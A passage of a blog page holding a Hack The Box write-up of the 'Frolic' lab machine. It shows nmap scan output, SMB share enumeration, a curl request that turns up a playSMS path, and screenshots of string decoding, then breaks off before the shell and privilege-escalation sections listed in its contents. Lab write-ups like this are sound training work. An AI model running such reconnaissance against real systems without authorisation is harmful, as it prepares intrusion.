@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Port Scan# Nmap 7.93 scan initiated Thu Dec 15 09:06:29 2022 as: nmap -p- -A --min-rate 10000 -oN portscan.txt 10.10.10.111 Nmap scan report for 10.10.10.111 Host is up (0.26s latency). Not shown: 655">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Frolic">
+<meta property="og:url" content="http://kelpie.top/post/Virtual%20Attack[20].html">
+<meta property="og:site_name" content="Kelpie Blog">
+<meta property="og:description" content="Port Scan# Nmap 7.93 scan initiated Thu Dec 15 09:06:29 2022 as: nmap -p- -A --min-rate 10000 -oN portscan.txt 10.10.10.111 Nmap scan report for 10.10.10.111 Host is up (0.26s latency). Not shown: 655">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoZka-WIa3udY0U6YWDFEHM38qIf.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoZnURl2QnJExVMR63qb6QmmP14c.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnB72vrESl3jUaaJtTaaEoKmn1Wy.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FryG5ZJzSIqJDKzMJCgtP7_NbWZC.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FllwD7WYHoqW2_rOu8jZEktTepRq.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv8NoVsvh9q64j6oGv2sIxuohkXJ.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvbNT9NEbFric7yZewB7NzLYeLe8.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fnm7qiaLaSqoPfKU88lqttvJh4IX.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fq6g3nfqm2R5nA-avQj82wM-5RjE.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fhir_bwZCuZobw3QmWs2g_mIwDEK.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjD336Vw2nn2nnlH0hkr4XxgaiIj.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqGNBtYYQ2nxQrzghKA5Sk_b--Yl.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtzsnmLJjSYAbp-AjkkO_ZdhALV-.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvK-4WMO4bfVQAoR6GQGk2KnVn-1.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtIWlAqNWbb_-4z3i4PH_nehbfal.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkYA-3aZIdvm3CjzbDkT8CZEkxF9.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FheS7zOHVwdmoWiDGTCf_MTHq3Mm.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FmKnB4IMZpaYN4zfUifwEKOLVJ74.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fq6wFxJWiWtWrqKQ6knHbmRyRURb.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoQQFYRC1EDTYLWN46DL9f4d03Fk.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtUrpHOIy-hFFX8Fc3BLKfQi6lkU.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FuwsjLKrNkjfJb3ffu2kTDNOBUi1.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsvtxGgcX5LJ-Jrjv2EwZ9aawxMo.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtLpfknXvZDec4zuwbaFyMFqNe7q.png">
+<meta property="article:published_time" content="2022-12-16T14:18:00.000Z">
+<meta property="article:modified_time" content="2024-04-10T09:43:12.654Z">
+<meta property="article:author" content="l3vi4th4n">
+<meta property="article:tag" content="Hack the Box">
+<meta property="article:tag" content="Penestration Test">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoZka-WIa3udY0U6YWDFEHM38qIf.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB Frolic</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/post/Virtual%20Attack%5B19%5D.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/post/%5BMalware-Analysis%5D%20Static%20Analysis%201.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack[20].html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack[20].html&text=HTB Frolic"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack[20].html&title=HTB Frolic"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack[20].html&is_video=false&description=HTB Frolic"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Frolic&body=Check out this article: http://kelpie.top/post/Virtual%20Attack[20].html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack[20].html&title=HTB Frolic"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack[20].html&title=HTB Frolic"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack[20].html&title=HTB Frolic"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack[20].html&title=HTB Frolic"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack[20].html&name=HTB Frolic&description=&lt;h2 id=&#34;Port-Scan&#34;&gt;&lt;a href=&#34;#Port-Scan&#34; class=&#34;headerlink&#34; title=&#34;Port Scan&#34;&gt;&lt;/a&gt;Port Scan&lt;/h2&gt;&lt;pre class=&#34;line-numbers language-latex&#34; data-language=&#34;latex&#34;&gt;&lt;code class=&#34;language-latex&#34;&gt;# Nmap 7.93 scan initiated Thu Dec 15 09:06:29 2022 as: nmap -p- -A --min-rate 10000 -oN portscan.txt 10.10.10.111
+Nmap scan report for 10.10.10.111
+Host is up (0.26s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 877b912a0f11b6571ecb9f77cf35e221 (RSA)
+|   256 b79b06ddc25e284478411e677d1eb762 (ECDSA)
+|_  256 21cf166d82a430c3c69cd738bab502b0 (ED25519)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+1880/tcp open  http        Node.js (Express middleware)
+|_http-title: Node-RED
+9999/tcp open  http        nginx 1.10.3 (Ubuntu)
+|_http-server-header: nginx/1.10.3 (Ubuntu)
+|_http-title: Welcome to nginx!
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93&lt;span class=&#34;token comment&#34;&gt;%E=4%D=12/15%OT=22%CT=1%CU=33070%PV=Y%DS=2%DC=T%G=Y%TM=639B2A&lt;/span&gt;
+OS:26&lt;span class=&#34;token comment&#34;&gt;%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10C%TI=Z%CI=I%TS=8)SEQ(SP=&lt;/span&gt;
+OS:108&lt;span class=&#34;token comment&#34;&gt;%GCD=1%ISR=10B%TI=Z%II=I%TS=8)SEQ(SP=108%GCD=1%ISR=10C%TI=Z%CI=I%II=I&lt;/span&gt;
+OS:&lt;span class=&#34;token comment&#34;&gt;%TS=8)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%TS=A)OPS(O1=M539ST11NW7%O2=M539ST11N&lt;/span&gt;
+OS:W7&lt;span class=&#34;token comment&#34;&gt;%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=7120&lt;/span&gt;
+OS:&lt;span class=&#34;token comment&#34;&gt;%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M539&lt;/span&gt;
+OS:NNSNW7&lt;span class=&#34;token comment&#34;&gt;%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R&lt;/span&gt;
+OS:=Y&lt;span class=&#34;token comment&#34;&gt;%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=&lt;/span&gt;
+OS:AR&lt;span class=&#34;token comment&#34;&gt;%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=&lt;/span&gt;
+OS:40&lt;span class=&#34;token comment&#34;&gt;%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID&lt;/span&gt;
+OS:=G&lt;span class=&#34;token comment&#34;&gt;%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)&lt;/span&gt;
+
+Network Distance: 2 hops
+Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -1h49m58s, deviation: 3h10m30s, median: 0s
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: FROLIC, NetBIOS user: &amp;lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: frolic
+|   NetBIOS computer name: FROLIC&lt;span class=&#34;token function selector&#34;&gt;\x&lt;/span&gt;00
+|   Domain name: &lt;span class=&#34;token function selector&#34;&gt;\x&lt;/span&gt;00
+|   FQDN: frolic
+|_  System time: 2022-12-15T19:37:25+05:30
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time:
+|   date: 2022-12-15T14:07:26
+|_  start_date: N/A
+
+TRACEROUTE (using port 587/tcp)
+HOP RTT       ADDRESS
+1   254.76 ms 10.10.14.1
+2   254.86 ms 10.10.10.111
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Dec 15 09:07:34 2022 -- 1 IP address (1 host up) scanned in 64.79 seconds
+&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack[20].html&t=HTB Frolic"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-Scan"><span class="toc-number">1.</span> <span class="toc-text">Port Scan</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB"><span class="toc-number">1.1.</span> <span class="toc-text">SMB</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Node-Red-TCP-1880"><span class="toc-number">2.</span> <span class="toc-text">Node-Red - TCP 1880</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-contents-discovery"><span class="toc-number">4.</span> <span class="toc-text">Web contents discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#playsms"><span class="toc-number">5.</span> <span class="toc-text">playsms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#String-decryption"><span class="toc-number">6.</span> <span class="toc-text">String decryption</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#admin"><span class="toc-number">6.1.</span> <span class="toc-text">admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#success-html"><span class="toc-number">6.2.</span> <span class="toc-text">success.html</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x2F-asdiSIAJJ0QWE9JAS"><span class="toc-number">6.3.</span> <span class="toc-text">&#x2F;asdiSIAJJ0QWE9JAS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#index-php"><span class="toc-number">6.4.</span> <span class="toc-text">index.php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#www-data-shell"><span class="toc-number">7.</span> <span class="toc-text">www-data shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Priv-escalation"><span class="toc-number">8.</span> <span class="toc-text">Priv escalation</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB Frolic
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">l3vi4th4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-12-16T14:18:00.000Z" class="dt-published" itemprop="datePublished">2022-12-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Penetration-Test/">Penetration Test</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Hack-the-Box/" rel="tag">Hack the Box</a>, <a class="p-category" href="/tags/Penestration-Test/" rel="tag">Penestration Test</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Port-Scan"><a href="#Port-Scan" class="headerlink" title="Port Scan"></a>Port Scan</h2><pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"># Nmap 7.93 scan initiated Thu Dec 15 09:06:29 2022 as: nmap -p- -A --min-rate 10000 -oN portscan.txt 10.10.10.111
+Nmap scan report for 10.10.10.111
+Host is up (0.26s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 877b912a0f11b6571ecb9f77cf35e221 (RSA)
+|   256 b79b06ddc25e284478411e677d1eb762 (ECDSA)
+|_  256 21cf166d82a430c3c69cd738bab502b0 (ED25519)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+1880/tcp open  http        Node.js (Express middleware)
+|_http-title: Node-RED
+9999/tcp open  http        nginx 1.10.3 (Ubuntu)
+|_http-server-header: nginx/1.10.3 (Ubuntu)
+|_http-title: Welcome to nginx!
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93<span class="token comment">%E=4%D=12/15%OT=22%CT=1%CU=33070%PV=Y%DS=2%DC=T%G=Y%TM=639B2A</span>
+OS:26<span class="token comment">%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10C%TI=Z%CI=I%TS=8)SEQ(SP=</span>
+OS:108<span class="token comment">%GCD=1%ISR=10B%TI=Z%II=I%TS=8)SEQ(SP=108%GCD=1%ISR=10C%TI=Z%CI=I%II=I</span>
+OS:<span class="token comment">%TS=8)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%TS=A)OPS(O1=M539ST11NW7%O2=M539ST11N</span>
+OS:W7<span class="token comment">%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=7120</span>
+OS:<span class="token comment">%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M539</span>
+OS:NNSNW7<span class="token comment">%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R</span>
+OS:=Y<span class="token comment">%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=</span>
+OS:AR<span class="token comment">%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=</span>
+OS:40<span class="token comment">%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID</span>
+OS:=G<span class="token comment">%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span>
+
+Network Distance: 2 hops
+Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -1h49m58s, deviation: 3h10m30s, median: 0s
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: FROLIC, NetBIOS user: &lt;unknown>, NetBIOS MAC: 000000000000 (Xerox)
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: frolic
+|   NetBIOS computer name: FROLIC<span class="token function selector">\x</span>00
+|   Domain name: <span class="token function selector">\x</span>00
+|   FQDN: frolic
+|_  System time: 2022-12-15T19:37:25+05:30
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time:
+|   date: 2022-12-15T14:07:26
+|_  start_date: N/A
+
+TRACEROUTE (using port 587/tcp)
+HOP RTT       ADDRESS
+1   254.76 ms 10.10.14.1
+2   254.86 ms 10.10.10.111
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Dec 15 09:07:34 2022 -- 1 IP address (1 host up) scanned in 64.79 seconds
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<span id="more"></span>
+
+<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p><code>smbmap</code> and <code>smbclient</code> both show nothing interesting, two shares, with no anonymous access:</p>
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Finding open SMB ports....
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Guest SMB session established on 10.10.10.111...
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> IP: 10.10.10.111:445        Name: 10.10.10.111
+        Disk                                                    Permissions
+        ----                                                    -----------
+        print<span class="token equation string">$                                                  NO ACCESS
+        IPC$</span>                                                    NO ACCESS
+
+root@kali# smbclient -N -L //10.10.10.111
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print<span class="token equation string">$          Disk      Printer Drivers
+        IPC$</span>            IPC       IPC Service (frolic server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            FROLIC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Node-Red-TCP-1880"><a href="#Node-Red-TCP-1880" class="headerlink" title="Node-Red - TCP 1880"></a>Node-Red - TCP 1880</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoZka-WIa3udY0U6YWDFEHM38qIf.png"></h2><h2 id="Web-contents-discovery"><a href="#Web-contents-discovery" class="headerlink" title="Web contents discovery"></a>Web contents discovery</h2><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoZnURl2QnJExVMR63qb6QmmP14c.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnB72vrESl3jUaaJtTaaEoKmn1Wy.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FryG5ZJzSIqJDKzMJCgtP7_NbWZC.png"></p>
+<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex">curl 10.10.10.111:9999/dev/backup/
+/playsms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="playsms"><a href="#playsms" class="headerlink" title="playsms"></a>playsms</h2><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FllwD7WYHoqW2_rOu8jZEktTepRq.png"></p>
+<h2 id="String-decryption"><a href="#String-decryption" class="headerlink" title="String decryption"></a>String decryption</h2><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv8NoVsvh9q64j6oGv2sIxuohkXJ.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvbNT9NEbFric7yZewB7NzLYeLe8.png"></p>
+<h3 id="success-html"><a href="#success-html" class="headerlink" title="success.html"></a>success.html</h3><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fnm7qiaLaSqoPfKU88lqttvJh4IX.png"></p>
+<p>ook decryption<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fq6g3nfqm2R5nA-avQj82wM-5RjE.png"></p>
